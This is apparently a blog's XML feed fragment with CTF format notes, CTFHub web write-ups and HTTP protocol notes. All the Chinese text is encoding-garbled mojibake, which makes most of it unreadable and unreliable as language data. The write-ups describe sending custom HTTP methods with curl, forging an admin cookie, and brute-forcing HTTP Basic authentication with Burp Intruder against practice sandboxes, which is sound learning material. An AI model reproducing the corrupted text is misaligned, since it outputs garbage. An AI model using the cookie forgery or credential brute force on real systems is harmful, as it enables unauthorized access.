Time</code>ï¼Œå½“é€‰æ‰‹è®¤ä¸ºè‡ªå·±å·²ç»å¯ä»¥å®Œæˆé¢˜ç›®æ—¶ï¼Œé€‰æ‰‹å¯ä»¥åœ¨æ¯”èµ›å¹³å°ä¸Šæäº¤å±•ç¤ºç”³è¯·ï¼Œç”±å·¥ä½œäººå‘˜æ ¹æ®ç”³è¯·å…ˆåé¡ºåºè¿›è¡Œå±•ç¤ºæ’æœŸã€‚é€‰æ‰‹å±•ç¤ºä¹‹å‰éœ€è¦ä¸Šå°å¹¶è¿æ¥ç›¸å…³ç½‘ç»œï¼ŒåŒæ—¶ç°åœºå¤§å±ä¼šåˆ‡æ¢è‡³ç›®æ ‡çš„æ­£å¸¸é¡µé¢ã€‚é€‰æ‰‹ç¡®è®¤è¿æ¥å¹¶æµ‹è¯•OKä¹‹åå¼€å§‹è®¡æ—¶ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ä¸Šå°æ”»å‡»çš„æ—¶é—´ä¸º<code>5åˆ†é’Ÿ</code>ï¼Œé€‰æ‰‹ä¸€æ—¦å®Œæˆæ”»å‡»ç°åœºå¤§å±å¹•ä¼šå®æ—¶çœ‹åˆ°æ”»å‡»çš„æ•ˆæœï¼Œæ­¤æ—¶è£åˆ¤ä¼šæ ¹æ®æ•ˆæœæ˜¯å¦ç¬¦åˆé¢˜ç›®è¦æ±‚æ¥åˆ¤å®šè¯¥é¢˜æ˜¯å¦å®Œæˆã€‚å¦‚5åœ¨æ”»å‡»æ—¶é—´å†…ä¾ç„¶æœªèƒ½çœ‹åˆ°å±•ç¤ºæ•ˆæœåˆ™è®¤ä¸ºæœ¬æ¬¡æ”»å‡»å¤±è´¥ã€‚ç°å¦‚ä»Šä¸ºäº†é˜²æ­¢é€‰æ‰‹æ¶æ„æ’æœŸã€‚é€šå¸¸ä¼šæœ‰ä¸€ä¸ªé˜Ÿä¼æ€»å±•ç¤ºæ¬¡æ•°(ä¾‹å¦‚åœ¨2019å¹´æ•°å­—ç»æµäº‘å®‰å…¨å…¬æµ‹å¤§èµ›ä¸­æ¯ä¸ªé˜Ÿä¼åªå…è®¸ä¸Šå°å±•ç¤º30æ¬¡)ï¼Œé€‰æ‰‹ä¹Ÿéœ€è¦å°½å¯èƒ½ä¿è¯ä¸Šå°ä¹‹åæ”»å‡»çš„æˆåŠŸç‡ ä¸¾ä¸ªä¾‹å­ã€‚é¢˜ç›®è¦æ±‚éœ€è¦æ”»å‡»ä½äºæ¯”èµ›ç½‘ç»œä¸­çš„æŸä¸ªç½‘ç«™å¹¶å°†é¦–é¡µæ›¿æ¢ä¸ºåŒ…å«é˜Ÿä¼åç§°çš„é¡µé¢ã€‚é¢˜ç›®ç»™å‡ºè¯¥ç½‘ç«™çš„ä¸€äº›ä¿¡æ¯(æºä»£ç /æ•°æ®åº“ç­‰ç­‰)ï¼Œé€‰æ‰‹ç»è¿‡æœ¬åœ°æŒ–æ˜æ¼æ´ä¹‹åï¼Œæäº¤å±•ç¤ºç”³è¯·ï¼Œæ’æœŸåˆ°äº†ä¹‹åè¿›è¡Œä¸Šå°å±•ç¤ºã€‚æ³¨æ„ï¼Œå› ä¸ºRWæ¨¡å¼æ˜¯ä»¥å±•ç¤ºæ•ˆæœæ¥ä½œä¸ºé¢˜ç›®æ˜¯å¦å®Œæˆçš„å‡†åˆ™ï¼Œæ‰€ä»¥åœ¨RWæ¨¡å¼ä¸­å¹¶<code>ä¸å­˜åœ¨Flag</code>ã€‚</p><h2 id="KoH-æŠ¢å å±±å¤´"><a href="#KoH-æŠ¢å å±±å¤´" class="headerlink" title="KoH-æŠ¢å å±±å¤´"></a>KoH-æŠ¢å å±±å¤´</h2><p><strong>K</strong>ing <strong>o</strong>f <strong>H</strong>ill(KoH)æ˜¯è¿‘äº›å¹´æ–°è¡ç”Ÿçš„ä¸€ç§èµ›åˆ¶ã€‚è¯¥èµ›åˆ¶æœ‰ç‚¹ç±»ä¼¼äºAwDï¼Œä½†æ˜¯åˆå’ŒAwDæœ‰äº›ä¸ä¸€æ ·ã€‚é€‰æ‰‹é¢å¯¹çš„æ˜¯ä¸€ä¸ªé»‘ç›’çš„ç›®æ ‡ï¼Œéœ€è¦å…ˆæŒ–æ˜æ¼æ´å¹¶åˆ©ç”¨æ¼æ´æ§åˆ¶ç›®æ ‡ã€‚å°†è‡ªå·±çš„é˜Ÿä¼æ ‡è¯†(<code>é˜Ÿä¼åç§°</code>æˆ–æ˜¯<code>Token</code>ä¹‹ç±»)å†™å…¥åˆ°æŒ‡å®šæ–‡ä»¶ã€‚éšååœ¨è¯¥ä¸»æœºä¸Šè¿›è¡ŒåŠ å›ºç­‰æ“ä½œé˜²æ­¢å…¶ä»–é˜Ÿä¼æ”»å‡»ï¼Œä¸»åŠæ–¹ä¼šå®šæœŸå»æ£€æŸ¥æ ‡è¯†æ–‡ä»¶ï¼Œæ ¹æ®æ–‡ä»¶ä¸­çš„é˜Ÿä¼æ ‡è¯†æ¥åˆ¤å®šæœ¬å›åˆåˆ†æ•°ç»™äºˆå“ªä¸ªé˜Ÿä¼ã€‚å¯ä»¥çœ‹å‡ºKoHä¹Ÿæ˜¯ä¸€ç§å¯¹æŠ—æä¸ºæ¿€çƒˆçš„èµ›åˆ¶ï¼ŒåŒæ—¶è€ƒå¯Ÿé€‰æ‰‹çš„æ¸—é€èƒ½åŠ›åŠé˜²å¾¡åŠ å›ºèƒ½åŠ›ã€‚</p><h2 id="Mix-æ··åˆ"><a href="#Mix-æ··åˆ" class="headerlink" title="Mix[æ··åˆ]"></a>Mix[æ··åˆ]</h2><p>æ··åˆæ¨¡å¼ç»“åˆäº†ä»¥ä¸Šå¤šç§æ¨¡å¼ï¼Œç°å¦‚ä»Šå•ä¸€çš„èµ›åˆ¶å·²ç»æ— æ³•æ»¡è¶³æ¯”èµ›åŠé€‰æ‰‹çš„å‚èµ›éœ€æ±‚ï¼Œæ‰€ä»¥å¤§éƒ¨åˆ†æ¯”èµ›ä¼šåŒæ—¶ä»¥å¤šä¸ªæ¨¡å¼è¿›è¡Œæ¯”èµ›ã€‚ä¾‹å¦‚å‚èµ›é˜Ÿä¼é€šè¿‡è§£é¢˜(Jeopardy)å¯ä»¥è·å–ä¸€äº›åˆå§‹åˆ†æ•°ï¼Œç„¶åé€šè¿‡æ”»é˜²å¯¹æŠ—(AwD)è¿›è¡Œå¾—åˆ†å¢å‡çš„é›¶å’Œæ¸¸æˆï¼Œæœ€ç»ˆä»¥å¾—åˆ†é«˜ä½åˆ†å‡ºèƒœè´Ÿã€‚</p><h1 id="0x04-æ¯”èµ›å½¢å¼"><a href="#0x04-æ¯”èµ›å½¢å¼" class="headerlink" title="0x04 æ¯”èµ›å½¢å¼"></a>0x04 æ¯”èµ›å½¢å¼</h1><p>CTFæ¯”èµ›ä¸€èˆ¬åˆ†ä¸ºçº¿ä¸Šèµ›å’Œçº¿ä¸‹èµ›ã€‚é€šå¸¸æ¥è¯´ï¼Œçº¿ä¸Šèµ›å¤šä¸º<code>åˆèµ›</code>, çº¿ä¸‹èµ›å¤šä¸º<code>å†³èµ›</code>, ä½†æ˜¯ä¹Ÿä¸æ’é™¤ç›´æ¥è¿›è¡Œ</p><h2 id="çº¿ä¸Š"><a href="#çº¿ä¸Š" class="headerlink" title="çº¿ä¸Š"></a>çº¿ä¸Š</h2><p>é€‰æ‰‹é€šè¿‡ä¸»åŠæ–¹æ­å»ºçš„æ¯”èµ›å¹³å°åœ¨çº¿æ³¨å†Œï¼Œåœ¨çº¿åšé¢˜å¹¶æäº¤flagï¼Œçº¿ä¸Šæ¯”èµ›å¤šä¸ºè§£é¢˜æ¨¡å¼ï¼Œæ”»é˜²æ¨¡å¼è¾ƒä¸ºå°‘è§ã€‚é€šå¸¸æ¥è¯´å¯¹äºé•¿æ—¶é—´æœªè§£å‡ºçš„é¢˜ç›®ï¼Œä¸»åŠæ–¹ä¼šé…Œæƒ…ç»™å‡ºæç¤º(<code>Hint</code>)æ¥å¸®åŠ©é€‰æ‰‹åšé¢˜ã€‚</p><h2 id="çº¿ä¸‹"><a href="#çº¿ä¸‹" class="headerlink" title="çº¿ä¸‹"></a>çº¿ä¸‹</h2><p>é€‰æ‰‹å‰å¾€æ¯”èµ›æ‰€åœ¨åœ°ï¼Œç°åœºæ¥å…¥æ¯”èµ›ç½‘ç»œè¿›è¡Œæ¯”èµ›ï¼Œçº¿ä¸‹å¤šä¸ºAWDæ¨¡å¼ï¼Œè¿‘å¹´æ¥éšç€æ¯”èµ›èµ›åˆ¶çš„ä¸æ–­é©æ–°ï¼Œçº¿ä¸‹èµ›ä¹Ÿä¼šå‡ºç°å¤šç§æ¨¡å¼æ··åˆè¿›è¡Œï¼Œä¾‹å¦‚ç»“åˆ<strong>è§£é¢˜+AWD</strong>ï¼Œ<strong>è§£é¢˜+RW</strong> ç­‰ç­‰</p><h1 id="0x05-å‚è€ƒ"><a href="#0x05-å‚è€ƒ" class="headerlink" title="0x05 å‚è€ƒ"></a>0x05 å‚è€ƒ</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.ctfhub.com/">CTFHub</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> â†©</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub-Web-Webå‰ç½®æŠ€èƒ½-HTTPåè®®</title>
    <link href="/2021/07/30/CTF/Web/Write-up/CTFHub-Web-Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/"/>
    <url>/2021/07/30/CTF/Web/Write-up/CTFHub-Web-Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="1ã€è¯·æ±‚æ–¹å¼"><a href="#1ã€è¯·æ±‚æ–¹å¼" class="headerlink" title="1ã€è¯·æ±‚æ–¹å¼"></a>1ã€è¯·æ±‚æ–¹å¼</h2><p>å¯ä»¥çœ‹åˆ°ï¼Œå®ƒå‘Šè¯‰æˆ‘ä»¬ HTTP Methodæ˜¯ GETï¼Œä½¿ç”¨ CTF**B Methodï¼Œå®ƒå°±ä¼šç»™æˆ‘ä»¬ flagï¼Œè¿™é‡Œæ²¡æœ‰ç›´æ¥ç»™å‡º Method ï¼Œä½†å¯ä»¥çŒœæµ‹å¤§æ¦‚ç‡ä¼šæ˜¯ CTFHUB ï¼Œæˆ‘ä»¬å°† Method è¿›è¡Œä¿®æ”¹ï¼Œçœ‹èƒ½å¦å¾—åˆ° flagã€‚</p><p>æ³¨æ„ï¼Œå®ƒç»™äº†æˆ‘ä»¬ä¸€ä¸ª Hintï¼ˆæç¤ºï¼‰ï¼šå¦‚æœå¾—åˆ° <strong>HTTP Method Not Allowed</strong> é”™è¯¯ï¼Œæˆ‘ä»¬éœ€è¦è¯·æ±‚ <strong>index.php</strong>ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¯·æ±‚ <strong>index.php</strong> æ¥é¿å…å‡ºç°é”™è¯¯ã€‚</p><h3 id="1ï¼‰Curl"><a href="#1ï¼‰Curl" class="headerlink" title="1ï¼‰Curl"></a>1ï¼‰Curl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl -v -X CTFHUB http://challenge-05d6fc1837d37b70.sandbox.ctfhub.com:10080/index.php<br></code></pre></td></tr></table></figure><p>å¾—åˆ° flagï¼š<code>ctfhub&#123;8edef26a2f40c879b279f243&#125;</code> ã€‚</p><h3 id="2ï¼‰Burp"><a href="#2ï¼‰Burp" class="headerlink" title="2ï¼‰Burp"></a>2ï¼‰Burp</h3><p>æŠ“åŒ…</p><blockquote><p>å°†è¿™ä¸ªåŒ…å‘åˆ°é‡æ”¾æ¨¡å—ï¼ˆRepeaterï¼‰ï¼šä¿®æ”¹ Method<br>å‘é€åå°±å¯ä»¥å¾—åˆ°flag</p></blockquote><p>æˆ–</p><blockquote><p>æ›´æ”¹è¯·æ±‚æ–¹å¼ï¼Œæ›´æ”¹å®Œæˆåç‚¹å‡» Forwardï¼Œæ”¾åŒ…<br>æŸ¥çœ‹ç½‘é¡µè¿”å›æƒ…å†µï¼ŒæˆåŠŸæ‹¿åˆ° flag</p></blockquote><h2 id="2ã€302-è·³è½¬"><a href="#2ã€302-è·³è½¬" class="headerlink" title="2ã€302 è·³è½¬"></a>2ã€302 è·³è½¬</h2><p>ç‚¹å‡» <code>give me flag</code> å‘ç°åˆå›åˆ°äº†è¿™ä¸ªé¡µé¢ã€‚</p><p>æŸ¥çœ‹ç½‘é¡µæºç å¯çŸ¥ï¼Œç‚¹å‡» <code>give me flag</code> åº”è¯¥è·³è½¬åˆ° <code>index.php</code> ï¼Œå®é™…ä¸Šå´è·³è½¬åˆ°äº† <code>index.html</code> ï¼Œçœ‹æ¥æ˜¯è¢«é‡å®šå‘äº†ã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>curl</code> å‘½ä»¤è¡Œæ¥æŸ¥çœ‹å“åº”ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ <code>burp</code> æŠ“åŒ…æ¥æ”¹æˆ <code>index.php</code> ã€‚</p><h3 id="1ï¼‰Curl-1"><a href="#1ï¼‰Curl-1" class="headerlink" title="1ï¼‰Curl"></a>1ï¼‰Curl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl -v -X GET http://challenge-21ef394af4eb1915.sandbox.ctfhub.com:10800/index.php<br></code></pre></td></tr></table></figure><p>å¾—åˆ° flagï¼š<code>ctfhub&#123;bca0c758b9ce7a4db57631d6&#125;</code>ã€‚</p><h3 id="2ï¼‰Burp-1"><a href="#2ï¼‰Burp-1" class="headerlink" title="2ï¼‰Burp"></a>2ï¼‰Burp</h3><p>ä½¿ç”¨ <code>burp</code> æŠ“åŒ…ï¼Œå°†è¿™ä¸ªåŒ…å‘åˆ°é‡æ”¾æ¨¡å—ï¼›</p><p>å°† <code>index.html</code> ä¿®æ”¹ä¸º <code>index.php</code> ;</p><p>å‘é€ï¼Œå³å¯å¾—åˆ° <code>flag</code> ã€‚</p><h2 id="3ã€Cookie"><a href="#3ã€Cookie" class="headerlink" title="3ã€Cookie"></a>3ã€Cookie</h2><p>æ ¹æ®é¢˜ç›®ï¼Œæˆ‘ä»¬å¿…é¡»è¦ä¼ªé€ æˆç®¡ç†å‘˜æ‰èƒ½å¾—åˆ° <code>flag</code>ï¼Œå¯ä»¥é€šè¿‡æ”¹ <code>cookie</code> æ¥ä¼ªé€ æˆç®¡ç†å‘˜ã€‚</p><h3 id="1ï¼‰Burp"><a href="#1ï¼‰Burp" class="headerlink" title="1ï¼‰Burp"></a>1ï¼‰Burp</h3><p>ä½¿ç”¨ <code>burp</code> æŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ° <code>cookie: admin = 0</code></p><p>å°†è¿™ä¸ªåŒ…å‘åˆ°é‡æ”¾æ¨¡å—ï¼Œå°†å…¶ä¿®æ”¹ä¸º <code>cookie: admin = 1</code> ã€‚</p><p>å‘é€ï¼Œå¾—åˆ° flag ã€‚</p><h3 id="2ï¼‰HackBar"><a href="#2ï¼‰HackBar" class="headerlink" title="2ï¼‰HackBar"></a>2ï¼‰HackBar</h3><p>æŸ¥çœ‹å¾—çŸ¥ <code>Cookieï¼šadmin = 0</code></p><p>ç‚¹å‡» <code>Load URL</code> ï¼Œè½½å…¥ <code>URL</code></p><p>å‹¾é€‰ <code>Cookies</code> ï¼Œè¾“å…¥ <code>admin = 1</code></p><p>ç‚¹å‡» <code>Execute</code> ï¼Œè¿è¡Œï¼Œå¾—åˆ° flagï¼š<code>ctfhub&#123;3dd0714df3ce639635c048d7&#125;</code> ã€‚</p><h2 id="4ã€åŸºç¡€è®¤è¯"><a href="#4ã€åŸºç¡€è®¤è¯" class="headerlink" title="4ã€åŸºç¡€è®¤è¯"></a>4ã€åŸºç¡€è®¤è¯</h2><p>è¿›å…¥é¢˜ç›®é¡µé¢ï¼Œå‘ç°ç‚¹å‡» <code>click</code> ä¼šå‡ºç°è®¤è¯ç™»å½•é¡µé¢ï¼Œå…ˆä»»æ„è¾“å…¥ <code>admin/admin</code> è¿›è¡Œç™»å½•å°è¯•ï¼Œå‘ç°ä¸å¯¹ã€‚æŠ“åŒ…çœ‹æ•°æ®ï¼Œå¯ä»¥çœ‹è§ä¸€æ¡ç‰¹æ®Šå­—ç¬¦ä¸² <code>WWW-Authenticateï¼šBasic realm = &quot;Do u know admin ?&quot;</code> ï¼Œæš‚æ—¶æ²¡æœ‰å…¶ä»–çº¿ç´¢ï¼Œå‡è®¾ç”¨æˆ·åå°±æ˜¯ <code>admin</code>ï¼Œç„¶åè¿›è¡Œæš´åŠ›ç ´è§£ã€‚</p><blockquote><p>Basic ä¸ºéªŒè¯çš„æ¨¡å¼ï¼Œè¡¨ç¤ºåŸºç¡€è®¤è¯ï¼Œrealm = â€œDo u know admin ?â€ ä¸ºä¿æŠ¤åŸŸ</p></blockquote><p>å†æ¬¡è¾“å…¥ <code>admin/admin</code> è¿›è¡Œç™»å½•å°è¯•ï¼Œå¯¹è®¤è¯è¯·æ±‚è¿›è¡ŒæŠ“å–ï¼Œå¾—åˆ°è®¤è¯æ¶ˆæ¯ <code>Authorizationï¼šBasic YWRtaW46YWRtaW4=</code> ï¼Œ <code>YWRtaW46YWRtaW4=</code> å¤§æ¦‚ç‡ä¸º <code>Base64 ç¼–ç </code> ã€‚å°† <code>YWRtaW46YWRtaW4=</code> å‘åˆ° <code>Decoder</code> ï¼Œå¯¹å…¶è¿›è¡Œ <code>Base64 è§£ç </code>ï¼Œå¾—åˆ°å¼€å§‹å°è¯•è¾“å…¥çš„è´¦å·å’Œå¯†ç  <code>admin:admin</code> ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œå¯¹å…¶è¿›è¡Œæš´åŠ›ç ´è§£ï¼š</p><p>1ï¼‰å°†æŠ¥æ–‡å‘é€åˆ° <code>Intruder</code>ï¼Œç‚¹å‡» <code>Positions</code>ï¼Œå°†<code>YWRtaW46YWRtaW4=</code> æ·»åŠ ä¸º <code>Payload Positions</code> ã€‚</p><p>2ï¼‰åœ¨ <code>Payloads</code> é€‰é¡¹å¡ä¸‹ï¼Œé€‰æ‹© <code>Payload Type</code> ä¸º <code>Simple List</code>ï¼Œç„¶ååœ¨ <code>Payload Options</code> ä¸­ç‚¹å‡» <code>Load</code> åŠ è½½å¯†ç å­—å…¸ã€‚</p><p>3ï¼‰åœ¨ <code>Payload Options</code> ä¸­ï¼Œç‚¹å‡» <code>Add</code> ï¼Œé€‰æ‹© <code>Add Prefixï¼ˆæ·»åŠ å‰ç¼€ï¼‰</code> ï¼Œè¾“å…¥ <code>admin:</code> ã€‚</p><p>â€‹      åœ¨ <code>Payload Options</code> ä¸­ï¼Œç‚¹å‡» <code>Add</code> ï¼Œé€‰æ‹© <code>Encodeï¼ˆæ·»åŠ ä¸€ä¸ªç¼–ç æ–¹å¼ï¼‰</code> ï¼Œé€‰æ‹© <code>Base64 Encode</code> ã€‚</p><blockquote><p>æ³¨æ„ï¼šä¸€å®šè¦å…ˆåŠ å‰ç¼€ <code>admin:</code> ç„¶åå†è¿›è¡Œç¼–ç ï¼Œå› ä¸ºæœåŠ¡ç«¯åˆ¤æ–­çš„æ˜¯åˆå¹¶åçš„ base64 ç¼–ç ã€‚</p></blockquote><p>4ï¼‰åœ¨ <code>Payload Encode</code> ä¸­ï¼Œå–æ¶ˆå‹¾é€‰çš„ <code>URL-encode</code> ï¼Œä¸ç„¶ä½ ä¼šçœ‹åˆ° <code>base64</code> ä¹‹åçš„ <code>=</code> ä¼šè¢«è½¬æ¢æˆ <code>%3d</code> ï¼Œä½ å°±ç®—çˆ†ç ´åˆ°å¤©è’åœ°è€ä¹Ÿä¸ä¼šå‡ºæ¥ ã€‚</p><p>5ï¼‰ç‚¹å‡» <code>Start Attack</code> ï¼Œå¼€å§‹çˆ†ç ´ï¼Œå®ŒæˆåæŒ‰ <strong>Length</strong> æ’åºï¼Œå‘ç°ä¸€ä¸ªé•¿åº¦ä¸ä¸€æ ·çš„ï¼Œå¹¶çœ‹åˆ°çŠ¶æ€ç ä¸º <strong>200</strong> ï¼Œè¯´æ˜çˆ†ç ´æˆåŠŸ ã€‚</p><p>6ï¼‰ç‚¹å‡»æŸ¥çœ‹ï¼Œç‚¹å‡» <code>Response</code>ï¼Œå¾—åˆ° <code>flagï¼šctfhub&#123;a6bb3b3c9d6d4eeab2dae1f3&#125;</code></p><h2 id="5ã€å“åº”åŒ…æºä»£ç "><a href="#5ã€å“åº”åŒ…æºä»£ç " class="headerlink" title="5ã€å“åº”åŒ…æºä»£ç "></a>5ã€å“åº”åŒ…æºä»£ç </h2><p>æ ¹æ®é¢˜ç›®ï¼Œ<code>F12</code> æŸ¥çœ‹æºä»£ç ï¼Œå¾—åˆ° <code>flagï¼šctfhub&#123;15bf236024e2d2979ade7339&#125;</code> </p><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨ <code>curl</code> å’Œ <code>burp</code> å¾—åˆ° <code>flag</code> ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>HTTP</tag>
      
      <tag>Wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTPåè®®</title>
    <link href="/2021/07/30/CTF/Web/Notes/HTTP%E5%8D%8F%E8%AE%AE/"/>
    <url>/2021/07/30/CTF/Web/Notes/HTTP%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-HTTP-ç®€ä»‹"><a href="#0x01-HTTP-ç®€ä»‹" class="headerlink" title="0x01 HTTP ç®€ä»‹"></a>0x01 HTTP ç®€ä»‹</h1><p>HTTP åè®®ï¼ˆHyper Text Transfer Protocolï¼Œè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰æ˜¯ç”¨äºä»ä¸‡ç»´ç½‘ï¼ˆWWW ï¼šWorld Wide Web ï¼‰æœåŠ¡å™¨ä¼ è¾“è¶…æ–‡æœ¬åˆ°æœ¬åœ°æµè§ˆå™¨çš„ä¼ é€åè®®ï¼Œæ˜¯å› ç‰¹ç½‘ä¸Šåº”ç”¨æœ€ä¸ºå¹¿æ³›çš„ä¸€ç§ç½‘ç»œä¼ è¾“åè®®ï¼Œæ‰€æœ‰çš„ WWW æ–‡ä»¶éƒ½å¿…é¡»éµå®ˆè¿™ä¸ªæ ‡å‡†ã€‚</p><p>HTTP æ˜¯ä¸€ä¸ªåŸºäº TCP/IP é€šä¿¡åè®®æ¥ä¼ é€’æ•°æ®ï¼ˆHTML æ–‡ä»¶, å›¾ç‰‡æ–‡ä»¶, æŸ¥è¯¢ç»“æœç­‰ï¼‰ã€‚</p><h2 id="1ã€HTTP-å·¥ä½œåŸç†"><a href="#1ã€HTTP-å·¥ä½œåŸç†" class="headerlink" title="1ã€HTTP å·¥ä½œåŸç†"></a>1ã€HTTP å·¥ä½œåŸç†</h2><p>HTTP åè®®å·¥ä½œäºå®¢æˆ·ç«¯-æœåŠ¡ç«¯æ¶æ„ä¸Šã€‚æµè§ˆå™¨ä½œä¸º HTTP å®¢æˆ·ç«¯é€šè¿‡ URL å‘ HTTP æœåŠ¡ç«¯å³ WEB æœåŠ¡å™¨å‘é€æ‰€æœ‰è¯·æ±‚ã€‚</p><p>Web æœåŠ¡å™¨æœ‰ï¼šApache æœåŠ¡å™¨ï¼ŒIIS æœåŠ¡å™¨ï¼ˆInternet Information Servicesï¼‰ç­‰ã€‚</p><p>Web æœåŠ¡å™¨æ ¹æ®æ¥æ”¶åˆ°çš„è¯·æ±‚åï¼Œå‘å®¢æˆ·ç«¯å‘é€å“åº”ä¿¡æ¯ã€‚</p><p>HTTP é»˜è®¤ç«¯å£å·ä¸º 80ï¼Œä½†æ˜¯ä½ ä¹Ÿå¯ä»¥æ”¹ä¸º 8080 æˆ–è€…å…¶ä»–ç«¯å£ã€‚</p><p><strong>HTTPä¸‰ç‚¹æ³¨æ„äº‹é¡¹ï¼š</strong></p><ul><li>HTTP æ˜¯æ— è¿æ¥ï¼šæ— è¿æ¥çš„å«ä¹‰æ˜¯é™åˆ¶æ¯æ¬¡è¿æ¥åªå¤„ç†ä¸€ä¸ªè¯·æ±‚ã€‚æœåŠ¡å™¨å¤„ç†å®Œå®¢æˆ·çš„è¯·æ±‚ï¼Œå¹¶æ”¶åˆ°å®¢æˆ·çš„åº”ç­”åï¼Œå³æ–­å¼€è¿æ¥ã€‚é‡‡ç”¨è¿™ç§æ–¹å¼å¯ä»¥èŠ‚çœä¼ è¾“æ—¶é—´ã€‚</li><li>HTTP æ˜¯åª’ä½“ç‹¬ç«‹çš„ï¼šè¿™æ„å‘³ç€ï¼Œåªè¦å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çŸ¥é“å¦‚ä½•å¤„ç†çš„æ•°æ®å†…å®¹ï¼Œä»»ä½•ç±»å‹çš„æ•°æ®éƒ½å¯ä»¥é€šè¿‡ HTTP å‘é€ã€‚å®¢æˆ·ç«¯ä»¥åŠæœåŠ¡å™¨æŒ‡å®šä½¿ç”¨é€‚åˆçš„ MIME-type å†…å®¹ç±»å‹ã€‚</li><li>HTTP æ˜¯æ— çŠ¶æ€ï¼šHTTPåè®®æ˜¯æ— çŠ¶æ€åè®®ã€‚æ— çŠ¶æ€æ˜¯æŒ‡åè®®å¯¹äºäº‹åŠ¡å¤„ç†æ²¡æœ‰è®°å¿†èƒ½åŠ›ã€‚ç¼ºå°‘çŠ¶æ€æ„å‘³ç€å¦‚æœåç»­å¤„ç†éœ€è¦å‰é¢çš„ä¿¡æ¯ï¼Œåˆ™å®ƒå¿…é¡»é‡ä¼ ï¼Œè¿™æ ·å¯èƒ½å¯¼è‡´æ¯æ¬¡è¿æ¥ä¼ é€çš„æ•°æ®é‡å¢å¤§ã€‚å¦ä¸€æ–¹é¢ï¼Œåœ¨æœåŠ¡å™¨ä¸éœ€è¦å…ˆå‰ä¿¡æ¯æ—¶å®ƒçš„åº”ç­”å°±è¾ƒå¿«ã€‚</li></ul><h2 id="2ã€HTTP-æ¶ˆæ¯ç»“æ„"><a href="#2ã€HTTP-æ¶ˆæ¯ç»“æ„" class="headerlink" title="2ã€HTTP æ¶ˆæ¯ç»“æ„"></a>2ã€HTTP æ¶ˆæ¯ç»“æ„</h2><p>HTTP æ˜¯åŸºäºå®¢æˆ·ç«¯/æœåŠ¡ç«¯ï¼ˆC/Sï¼‰çš„æ¶æ„æ¨¡å‹ï¼Œé€šè¿‡ä¸€ä¸ªå¯é çš„é“¾æ¥æ¥äº¤æ¢ä¿¡æ¯ï¼Œæ˜¯ä¸€ä¸ªæ— çŠ¶æ€çš„è¯·æ±‚/å“åº”åè®®ã€‚</p><p>ä¸€ä¸ª HTTP â€œå®¢æˆ·ç«¯â€æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼ˆWeb æµè§ˆå™¨æˆ–å…¶ä»–ä»»ä½•å®¢æˆ·ç«¯ï¼‰ï¼Œé€šè¿‡è¿æ¥åˆ°æœåŠ¡å™¨è¾¾åˆ°å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªæˆ–å¤šä¸ª HTTP çš„è¯·æ±‚çš„ç›®çš„ã€‚</p><p>ä¸€ä¸ª HTTP â€œæœåŠ¡å™¨â€åŒæ ·ä¹Ÿæ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ªWeb æœåŠ¡ï¼Œå¦‚ Apache Web æœåŠ¡å™¨æˆ– IIS æœåŠ¡å™¨ç­‰ï¼‰ï¼Œé€šè¿‡æ¥æ”¶å®¢æˆ·ç«¯çš„è¯·æ±‚å¹¶å‘å®¢æˆ·ç«¯å‘é€HTTPå“åº”æ•°æ®ã€‚</p><p>HTTP ä½¿ç”¨ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ï¼ˆUniform Resource Identifiers, URIï¼‰æ¥ä¼ è¾“æ•°æ®å’Œå»ºç«‹è¿æ¥ã€‚</p><p>ä¸€æ—¦å»ºç«‹è¿æ¥åï¼Œæ•°æ®æ¶ˆæ¯å°±é€šè¿‡ç±»ä¼¼ Internet é‚®ä»¶æ‰€ä½¿ç”¨çš„æ ¼å¼[RFC5322]å’Œå¤šç”¨é€” Internet é‚®ä»¶æ‰©å±•ï¼ˆMIMEï¼‰[RFC2045]æ¥ä¼ é€ã€‚</p><h3 id="1ï¼‰å®¢æˆ·ç«¯è¯·æ±‚æ¶ˆæ¯"><a href="#1ï¼‰å®¢æˆ·ç«¯è¯·æ±‚æ¶ˆæ¯" class="headerlink" title="1ï¼‰å®¢æˆ·ç«¯è¯·æ±‚æ¶ˆæ¯"></a>1ï¼‰å®¢æˆ·ç«¯è¯·æ±‚æ¶ˆæ¯</h3><p>å®¢æˆ·ç«¯å‘é€ä¸€ä¸ª HTTP è¯·æ±‚åˆ°æœåŠ¡å™¨çš„è¯·æ±‚æ¶ˆæ¯åŒ…æ‹¬ä»¥ä¸‹æ ¼å¼ï¼šè¯·æ±‚è¡Œï¼ˆrequest 